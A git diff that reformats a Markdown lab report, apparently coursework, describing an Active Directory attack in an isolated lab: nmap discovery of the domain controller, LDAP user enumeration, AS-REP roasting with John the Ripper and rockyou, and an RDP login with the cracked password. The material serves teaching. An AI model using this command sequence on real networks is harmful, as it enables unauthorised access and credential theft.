@@ -94,8 +94,9 @@ Once set-up the environment, it is finally possible to begin the laboratory!
  0. **Open a Shell**;
  
  1. **Find the IP address of the Domain Controller**:
- To begin, we need to find the IP address of the DomainController.
- For doing so, we execute the following command: 
+
+ 	To begin, we need to find the IP address of the DomainController.
+	 For doing so, we execute the following command: 
  
     `nmap -p 389 -A -v -Pn 10.0.2.0/24`
     
@@ -106,7 +107,8 @@ Once set-up the environment, it is finally possible to begin the laboratory!
 	 ![Response of the nmap request](https://raw.githubusercontent.com/AM311/Cybersecurity_Report/main/img/nmap_DC.png)
 
  2. **Understand the existing accounts and groups**:
-	In order to choose our targets, we need to be aware of what the domain accounts are and which groups they belong to.
+	
+ 	In order to choose our targets, we need to be aware of what the domain accounts are and which groups they belong to.
 	For doing so, we ask the DomainController, via a LDAP query, to list us all the entries in the `Users` Active Directory default container, where we (correctly) assume that all user accounts are stored:
 
     `ldapsearch -x -b "cn=Users,dc=cybersec,dc=units,dc=it" -H "ldap://10.0.2.200" -D "cn=Utente Dominio,cn=Users,dc=cybersec,dc=units,dc=it" -w 'User00!'`
@@ -154,7 +156,8 @@ We will try to crack the `DNSoperator` password performing a so-called **AS-Rep 
 	    85d516545f661aef05c22fc5c26a210a4243627cf681ea61f45996fb8d235b3f9d972433c390ff3b4250f
 	    576c96c54d167a61a76717831eb320b84aa37acef60cd3f1c781bf6e`
 
-	Now, we try to crack the hash using **John the Ripper**, providing a password dictionary called `rockyou`.
+	
+ 	Now, we try to crack the hash using **John the Ripper**, providing a password dictionary called `rockyou`.
 	
     `john --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5asrep ./Desktop/usernames.txt`
 
@@ -165,7 +168,8 @@ We will try to crack the `DNSoperator` password performing a so-called **AS-Rep 
 	 We are now able to legitimately login to `SERVERDNS`, so we will try to perform some "useful" actions!
  
  5. **Open a remote connection to `SERVERDNS`:**
-		To open a remote desktop connection, we use the following command:
+		
+  	To open a remote desktop connection, we use the following command:
 
     `rdesktop 10.0.2.250 -u DNSoperator -p Qwerty123 -d cybersec.units.it -r disk:share=~/Desktop/share`
 
